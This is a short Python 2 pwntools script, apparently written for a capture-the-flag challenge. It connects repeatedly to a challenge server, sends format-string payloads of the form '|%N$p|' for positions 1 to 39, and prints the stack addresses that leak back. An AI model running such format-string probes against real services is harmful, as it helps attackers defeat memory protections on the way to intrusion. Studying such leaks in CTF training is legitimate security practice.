from pwn import *

#p=process("./cookie_monster")

for num in range(1,40):
	p=remote('dorsia3.wpictf.xyz', 31337)
	payload = "|%"+str(num)+"$p|"
	print p.recvline()
	p.sendline(payload)
	stack =  p.recvline().split('|')[1]
	if stack == "(nil)":
		continue;
	addr = int(stack,16)
	print "leaked addr"+str(num)+": "+hex(addr)
	p.close()
	p.shutdown()